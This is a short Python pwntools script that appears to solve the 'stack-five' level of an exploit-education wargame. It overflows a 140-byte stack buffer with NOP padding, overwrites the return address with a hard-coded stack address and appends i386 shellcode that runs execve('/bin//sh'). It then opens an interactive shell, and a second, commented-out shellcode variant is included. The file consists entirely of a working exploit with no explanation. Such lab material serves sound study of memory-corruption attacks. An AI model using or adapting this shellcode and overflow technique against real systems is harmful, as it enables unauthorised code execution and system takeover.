from pwn import *

#context.log_level = 'DEBUG'
context(os ='linux', arch = 'i386')
p = process('stack-five')

total_len = 140

# eip at 0xffffd150
eip = "\x50\xd1\xff\xff"

payload = ""
payload += "\x90" * total_len
payload += eip

payload += "\x31\xc0\x50\x68\x2f\x2f\x73"
payload += "\x68\x68\x2f\x62\x69\x6e\x89"
payload += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
payload += "\xcd\x80\x31\xc0\x40\xcd\x80"

#payload += "\x68\xcd\x80\x68\x68\xeb\xfc\x68"
#payload += "\x6a\x0b\x58\x31\xd2\x52\x68\x2f"
#payload += "\x2f\x73\x68\x68\x2f\x62\x69\x6e"
#payload += "\x89\xe3\x52\x53\x89\xe1\xeb\xe1"

#print(payload)
#gdb.attach(p)

p.sendline(payload)
p.interactive()
